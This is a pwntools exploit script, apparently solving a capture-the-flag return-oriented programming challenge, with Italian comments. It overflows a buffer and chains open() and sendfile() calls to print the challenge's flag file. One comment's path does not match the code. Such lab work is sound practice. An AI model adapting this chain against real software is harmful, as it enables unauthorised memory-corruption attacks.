from pwn import *

context.arch = 'amd64'
elf = ELF('/challenge/babyrop_level6.0')
rop = ROP(elf)


io = elf.process()

main_path = next(elf.search(b'main\x00')) # mi serve per ottenere il ottenere l'indirizzo di main che è linkato alla flag


payload = b"A" * 56

# open("/flag", O_RDONLY)
payload += p64(rop.rdi.address)
payload += p64(main_path)
payload += p64(rop.rsi.address)
payload += p64(0)
payload += p64(elf.symbols.open)

# sendfile(1, 3, NULL, 50000)
payload += p64(rop.rdi.address)    # Primo arg: out_fd (1 = stdout)
payload += p64(1)                  # File descriptor di stdout
payload += p64(rop.rsi.address)    # Secondo arg: in_fd (3 = file aperto)
payload += p64(3)                  # Assumendo che open() ritorni FD 3
payload += p64(rop.rdx.address)    # Terzo arg: offset (NULL)
payload += p64(0)                  # Nessun offset
payload += p64(rop.rcx.address)    # Quarto arg: count
payload += p64(50000)              # Legge fino a 50000 bytes
payload += p64(elf.symbols.sendfile) # Chiamata a sendfile()

io.sendline(payload)
io.interactive()
